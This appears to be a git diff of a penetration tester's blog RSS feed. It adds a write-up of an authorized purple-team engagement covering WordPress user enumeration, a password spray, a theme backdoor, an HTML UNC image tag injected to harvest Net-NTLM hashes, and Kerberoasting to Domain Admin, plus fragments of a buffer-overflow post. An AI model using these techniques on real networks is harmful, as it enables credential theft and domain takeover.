@@ -5,12 +5,166 @@
     <description>Security enthusiast. Penetration tester. Adrenaline junky.</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Mon, 13 Aug 2018 23:46:32 +1000</pubDate>
-    <lastBuildDate>Mon, 13 Aug 2018 23:46:32 +1000</lastBuildDate>
+    <pubDate>Tue, 28 Aug 2018 00:55:12 +1000</pubDate>
+    <lastBuildDate>Tue, 28 Aug 2018 00:55:12 +1000</lastBuildDate>
     <generator>Jekyll v3.6.2</generator>
     
       <item>
-        <title>Gaining a foothold: LyncSmash &amp;&amp; Linkedin2username</title>
+        <title>No Responder? No problem! - Abusing HTML and UNC</title>
+        <description>&lt;p&gt;When I first began learning about IT security, AV evasion meant encoding signatures, and &lt;code class=&quot;highlighter-rouge&quot;&gt;' OR '1' = '1&lt;/code&gt; was enough to get into most web applications. 14 years later, security has evolved into a much different
+landscape. While the above techniques certainly still work in some cases, today’s networks are much more complex. AV’s now have sandboxes and emulators, and web applications are protected on the 7th layer.
+The last thing a consultant wants during an engagement is to be caught because one of their payloads tripped a defense mechanism.&lt;/p&gt;
+
+&lt;p&gt;A few months ago I was part of a purple team engagement, during which a client hired us to both test their internal network security as well as their newly hired SOC’s ability to catch malicious activity.
+This was an interesting engagement because unlike most regular internal engagements, we had a team actively looking for us. This meant using our standard tools became too risky, so we had to think of a different
+approach.&lt;/p&gt;
+
+&lt;h3 id=&quot;1-getting-credentials-responder-maybe-not&quot;&gt;1. Getting credentials: Responder? Maybe not.&lt;/h3&gt;
+&lt;p&gt;After a quick kickoff meeting we were off. Normally, in a regular internal penetration test this is where I would fire up wireshark and start listening for NBT-NS and LLMNR broadcasts. If found, fire up Responder,
+collect some Net-NTLM hashes, throw hashcat at them and in some cases, r00t dance. However, we figured this would likely get us caught. To explain why, lets go back to how and why Responder works. I am not going to go
+into the details of Responder and NBT-NS/LLMNR poisoning as the internet is filled with explanations of the attack. Suffice to say that when DNS fails to resolve a hostname for whatever reason 
+(user “fat fingers” the name, DNS UDP packet - yes, &lt;a href=&quot;https://www.ietf.org/rfc/rfc1035.txt&quot;&gt;UDP&lt;/a&gt; - gets dropped, or some other reason) it turns back to Link Layer Multicast Name Resolution and NetBios name
+service to resolve the name. It does this by sending a broadcast literally asking who the host is.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/responder/Query_Broadcast.png&quot; alt=&quot;Who there&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This is where Responder comes in. Depending on how its run, Responder may reply to some/all queries saying saying yep thats me. This then kicks off the NTLM authentication scheme and results in the 
+challenge-response Net-NTLM hash we then proceed to crack or relay.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/responder/response.png&quot; alt=&quot;l00t&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So, now that we know how the attack works, can you think of how detection works? Well, if Responder is run to respond to all queries where DNS fails, it will respond to everything. If a security appliance
+were to broadcast someting that it knows is not present in the network like \\thisdoesnotexist\, it can assume that anything that responds to this will likely be malicious and raise a flag.&lt;/p&gt;
+
+&lt;p&gt;Well, the network is safe, lets pack it up and go home, blue team won.&lt;/p&gt;
+
+&lt;p&gt;Not quite.&lt;/p&gt;
+
+&lt;p&gt;Enumerating the network further we found the intranet 
+page. A quick look revealed it was running WordPress, which meant if we could just get access to an account we could probably get code execution. Again, a vulnerability
+scanner like WPScan would have been great here, but as stealth was important we opted for a manual approach. Examination revealed a fully patched installation, and looking through some of the source 
+we saw references to a security plugin which made things a bit harder. We had two options. Either find an 0day in a plugin/Wordpress, which in a time boxed engagement is basically a no go, or compromise a user account.
+Wordpress has a very handy feature that allows for username enumeration by appending &lt;code class=&quot;highlighter-rouge&quot;&gt;/?author=1&lt;/code&gt; to the url. We tested this in the browser and succesfully got the username of the first account.
+We then scripted the attack, being mindful of pausing a few minutes between requests, and tried enumerating the first 100 accounts. This yielded 76 different user accounts. We then tried a password spray with
+good ol’ &lt;code class=&quot;highlighter-rouge&quot;&gt;Password1&lt;/code&gt; (you’d be surprised how many times that works) and success! 4 accounts went down, one of which was an administrator.&lt;/p&gt;
+
+&lt;p&gt;A backdoor on one of the theme pages got us code execuion on the server, which showed WordPress running as a restricted user. Looking for easy kills for privilege escalation did not result in anything obvious
+so instead we opted to leverage our WordPress access to harvest some Net-NTLM hashes.&lt;/p&gt;
+
+&lt;p&gt;Net-NTLM hashes are the result of the NTLM challenge-response authentication scheme. Basically, when client A tries to access a resource on Server B, it must authenticate against it first. The process can be found in &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/SecAuthN/microsoft-ntlm&quot;&gt;Microsoft documentation&lt;/a&gt;
+but sumarized below:&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;(Interactive authentication only) A user accesses a client computer and provides a domain name, user name, and password. The client computes a cryptographic hash of the password and discards the actual password.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;The client sends the user name to the server (in plaintext).&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;The server generates a 16-byte random number, called a challenge or nonce, and sends it to the client.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;The client encrypts this challenge with the hash of the user’s password and returns the result to the server. This is called the response.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;The server sends the following three items to the domain controller:
+  User name
+  Challenge sent to the client
+  Response received from the client&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;The domain controller uses the user name to retrieve the hash of the user’s password from the Security Account Manager database. It uses this password hash to encrypt the challenge.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;The domain controller compares the encrypted challenge it computed (in step 6) to the response computed by the client (in step 4). If they are identical, authentication is successful.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+&lt;p&gt;There are significant differences between NTLMv1 and NTLMv2, but thats a topic for a different post. As we are dealing with windows 7/2008+ systems, NTLM here refers to NTLMv2.&lt;/p&gt;
+
+&lt;p&gt;From the above we can see that if we can somehow get someone to try and access a resource on our system (acting as the server on the above example), we’ll be able to grab the Net-NTLM hash. 
+There are many different ways of accomplishing this but the more interesting one given the circumstances is through HTML.
+IE and EDGE (although ive succesfully tested with Chrome as well) both support UNC paths to load resources (such as images). An image tag like &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;img src=&quot;\\x.x.x.x\doesnotmatter.png&quot; /&amp;gt;&lt;/code&gt; would try to pull
+&lt;code class=&quot;highlighter-rouge&quot;&gt;doesnotmatter.png&lt;/code&gt; from &lt;code class=&quot;highlighter-rouge&quot;&gt;x.x.x.x&lt;/code&gt;, which would kick off the authentication process with &lt;code class=&quot;highlighter-rouge&quot;&gt;x.x.x.x&lt;/code&gt;. Since the code executes in the browser of the client browsing our evil page, 
+the resulting hash would belong to the user using the browser.&lt;/p&gt;
+
+&lt;p&gt;So, to recap: We have managed to gain administrative access to the WordPress site of the companies internal intranet, where it is safe to assume most browsers will land on when opened, and a way to abuse
+evil html to grab NetNTLM hashes. See where im going with this?&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/responder/wp.png&quot; alt=&quot;knock knock&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Before saving the above, I started Metasploit’s SMB server to catch all incoming connections. Note that I could have also used Impacket’s smbserver.py or even Responder by disabling the responses to queries,
+but Metasploit was just convenient at the time. As soon as the server was started and the file saved, hashes from all over the domain started flying in! In total I believe we gathered over 200 hashes in under an 
+hour.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/responder/msf.png&quot; alt=&quot;Who there&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Edit: If administrative access is available or there is access to a system with wireshark installed, and our smbserver tools are not available, I strongly recommend collecting hashes&lt;/em&gt;
+&lt;em&gt;with wireshark. Once enough hashes have been collected, bring the pcap over to a linux box and extract the NetNTLM hashes with &lt;a href=&quot;https://github.com/DanMcInerney/net-creds&quot;&gt;this&lt;/a&gt; fantastic tool&lt;/em&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;pwning-the-domain-red-team-1-blue-team-0&quot;&gt;Pwning the Domain: Red team 1, Blue team 0&lt;/h3&gt;
+
+&lt;p&gt;With plenty of hashes, the next step was to crack them and begin moving laterally. Hashcat cracked roughly 20 accounts in a relatively short period of time. Checking these account’s permissions we discovered
+that none had elevated privileges. No matter, with domain credentials its usually only a matter of time before the domain goes down. Remembering the SOC’s watchfull eyes over us, we kept our recognizance
+to a minimum to prevent tripping any alert from monitoring systems. Instead, we opted for what are considered easy kills, which meant Kerberoasting.&lt;/p&gt;
+
+&lt;p&gt;Kerberoasting is the name of the attack given by &lt;a href=&quot;https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf&quot;&gt;Tim Medina in 2014&lt;/a&gt; to attacking Microsoft Windows Kerberos authentication. 
+While a full description is out of scope, The following graphic taken from &lt;a href=&quot;https://technet.microsoft.com/pt-pt/library/cc772815(v=ws.10).aspx&quot;&gt;Microsoft&lt;/a&gt; illustrates the basics we need to understand for this attack:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/responder/kerberos.gif&quot; alt=&quot;Kerberos&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;To summarize the above, at logon, the client contacts the Key Distribution Center (KDC) and requests a Ticket Ticket Grating Ticket (TGT) from the KDC. The KDC valdiates the users information, such as 
+permissions and group memberships, and if they check out it will issue a TGT. If the user then wishes to access a service, it will need to supply the TGT as well as the target’s service principal
+name (SPN). A SPN &lt;a href=&quot;https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx&quot;&gt;is the name by which a Kerberos client uniquely identifies an instance of a service for a given Kerberos target computer&lt;/a&gt;
+After verifying the data in the TGT (which only the KDC can read). the KDC will issue a TGS back to the client which &lt;em&gt;is signed with the target SPN’s NTLM hash&lt;/em&gt;. The TGS will then be presented to the service, 
+which will ultimately decide whether or not to provide access.&lt;/p&gt;
+
+&lt;p&gt;We are interested in step 3/4. In modern systems, Kerberos uses AES encryption to encrypt the TGS ticket. However, this was not introduced until &lt;a href=&quot;https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-vista/cc749438(v=ws.10)&quot;&gt;Windows Vista/ and Windows 2008&lt;/a&gt;. 
+Since Active Directory’s introduction in Windows 2000, Windows has used RC4_HMAC symmetric encryption which uses the target SPN’s NT (or NTLM as some of you may know it)
+hash as the encryption/decryption key! Even though AES is the default, RC4 is still found due to
+compatability requriements (since some services/systems do not yet support AES). If we look at the graffic above, any user can request a TGT from the KDC with valid domain credentials.
+These do not have to belong to any privileged group - Kerberos lets the target service/system decide whether or not to grant permission to the user to use the service - which means any low privilege account can
+get as many TGS tickets for different SPN’s as we want! There are certain restrictions in regards to which SPN’s are better for cracking and why, and if you’d like to know more I strongly recommend going &lt;a href=&quot;https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf&quot;&gt;here&lt;/a&gt;
+and &lt;a href=&quot;https://adsecurity.org/?p=2293&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Cool, so how does this help us? Well, the accounts created for services are usually over permissioned and part of the Domain Admin’s group, as well as have passwords that are set to not expire, usually created
+by a human (which as we know are horrible at creating truly random passwords). This means if we request TGS tickets encrypted with RC4 for a specific (or all available) SPN’s, we can then attempt to open the tickets
+by computing various NTHashes and trying to open the ticket. If we are succesful, it means we have the correct NTHash, which means we would have found the correct password for the target service account!
+The best part? &lt;strong&gt;&lt;em&gt;All this is done offline&lt;/em&gt;&lt;/strong&gt;. The attack is very hard to detect, because there are no explotis being launched, no malware being placed on any target system, and no bruteforcing being done against
+AD. Although there &lt;a href=&quot;https://adsecurity.org/?p=3513&quot;&gt;are ways to detect the attack&lt;/a&gt;, we felt fairly confident the logs were not being monitored to this degree.&lt;/p&gt;
+
+&lt;p&gt;We used Impacket’s GetSPNs.py to request a list of all suiteable SPN’s for cracking using one of the cracked accounts, and got to work. A short time later, there was a hit. Sure enough, after checking the account’s
+group membership there it was: Domain Admins.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/responder/getuserspn.png&quot; alt=&quot;Kerberos&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;From here it was easy to grab the crown jewels. A few screen shots later, we had everythind we needed and the engagement was done. Throughout the whole test we managed to stay hidden from the SOC and raised no flags. 
+As part of the engagement, our report was given to them, and we had the chance to work with them on defenses and indicators against the above attacks. 
+In both WordPress and Kerberoasting instances, the underlying issue was not enforcing the least privilege principle. Over permissioned accounts in WordPress with weak credentials led to the disclosure of 
+hundreds of domain account hashes, which gave us the foothold required to request TGS tickets. Weak passwords allowed these to be cracked, which once again due to excessive permissions led to the 
+compromise of the whole Active Directory environment.&lt;/p&gt;
+
+</description>
+        <pubDate>Fri, 10 Aug 2018 20:04:23 +1000</pubDate>
+        <link>http://localhost:4000/2018/Responder/</link>
+        <guid isPermaLink="true">http://localhost:4000/2018/Responder/</guid>
+        
+        <category>Stealth,</category>
+        
+        <category>Evasion,</category>
+        
+        <category>Internal</category>
+        
+        
+        <category>Internal</category>
+        
+      </item>
+    
+      <item>
+        <title>Breaking the perimeter: LyncSmash &amp; Linkedin2username</title>
         <description>&lt;p&gt;In this blog I am going to cover some little known tools that have proven extremely valuable when breaching the perimeter during external engagements. I think most penetration testers will agree that in the 
 majority of cases, the perimeter is rarely breached with CVE’s (although one still finds the odd lone forgotten server at some obsuce subdomain). Instead of attacking the technologies at the different
 endpoints, I prefer to attack the weakest link in the security chain: Humans. Wether it is through social engineering, phishing, or password attacks, humans tend to be the easiest to exploit.&lt;/p&gt;
@@ -74,7 +228,7 @@ hijacked accounts to access the companies intranet and external resources. From 
 &lt;p&gt;Thanks for reading!&lt;/p&gt;
 
 </description>
-        <pubDate>Mon, 11 Jun 2018 01:04:23 +1000</pubDate>
+        <pubDate>Wed, 11 Jul 2018 01:04:23 +1000</pubDate>
         <link>http://localhost:4000/2018/Gaining-a-Foothold/</link>
         <guid isPermaLink="true">http://localhost:4000/2018/Gaining-a-Foothold/</guid>
         
@@ -220,7 +374,7 @@ payload and therefore crash the target.&lt;/p&gt;
 &lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;When we run it, our application crashes, and immediately we can see that our EIP contains \x43\x43\x42\x42. Seeing as the payload lengths are the same, we can already see some characters got mangled in the stack.
+&lt;p&gt;When we run it, our application crashes, and immediately we can see that our EIP contains &lt;code class=&quot;highlighter-rouge&quot;&gt;\x43\x43\x42\x42&lt;/code&gt;. Seeing as the payload lengths are the same, we can already see some characters got mangled in the stack.
 If we examine the stack we can see that &lt;code class=&quot;highlighter-rouge&quot;&gt;\x25\x26\x27\x2b&lt;/code&gt; where either ommitted or replaced by another character. Lets take these out of our bad char buffer and send the payload again.&lt;/p&gt;
 
 &lt;p&gt;Great, examining our buffer we see that once again our EIP is overwritten with B’s and our stack contains all the characters sent.&lt;/p&gt;
@@ -617,9 +771,13 @@ Replicate the target as closely as possible first in a lab, and only once you ar
         
         <category>BoF,</category>
         
-        <category>Fuzzing,</category>
+        <category>Stack</category>
         
-        <category>Spike</category>
+        <category>overflow,</category>
+        
+        <category>EggHunter,</category>
+        
+        <category>Shellcode</category>
         
         
         <category>BoF,</category>
